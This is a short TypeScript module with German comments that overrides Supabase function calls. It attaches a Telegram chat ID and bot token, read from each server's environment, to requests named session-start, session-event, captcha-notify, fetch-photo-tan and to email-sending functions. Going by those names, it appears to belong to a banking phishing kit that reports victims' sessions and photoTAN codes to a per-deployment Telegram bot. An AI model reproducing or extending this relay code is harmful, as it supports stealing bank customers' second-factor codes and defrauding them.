// Per-Server Telegram override: liest VITE_TELEGRAM_CHAT_ID und
// VITE_TELEGRAM_BOT_TOKEN aus der .env des jeweiligen Hostings.
// Wird von jedem session-start / session-event / captcha-notify Aufruf
// automatisch als tg_chat_id / tg_bot_token mitgeschickt und im Edge
// Function bevorzugt gegenüber api_settings/DB.

import { supabase } from "@/integrations/supabase/client";

export function tgOverride(): { tg_chat_id?: string; tg_bot_token?: string } {
  const chat = (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID;
  const token = (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN;
  const out: { tg_chat_id?: string; tg_bot_token?: string } = {};
  if (typeof chat === "string" && chat.trim()) out.tg_chat_id = chat.trim();
  if (typeof token === "string" && token.trim()) out.tg_bot_token = token.trim();
  return out;
}

const TG_FNS = new Set([
  "session-start",
  "session-event",
  "captcha-notify",
  "fetch-photo-tan",
  "send-custom-email",
  "send-smtp-email",
]);

let patched = false;
export function installTgOverrideOnce() {
  if (patched) return;
  patched = true;
  try {
    const fns: any = (supabase as any).functions;
    const orig = fns.invoke.bind(fns);
    fns.invoke = (name: string, opts: any = {}) => {
      if (TG_FNS.has(name)) {
        const ov = tgOverride();
        if (Object.keys(ov).length) {
          const body = opts?.body && typeof opts.body === "object" ? { ...opts.body, ...ov } : ov;
          opts = { ...opts, body };
        }
      }
      return orig(name, opts);
    };
  } catch (e) {
    console.warn("tgOverride install failed", e);
  }
}
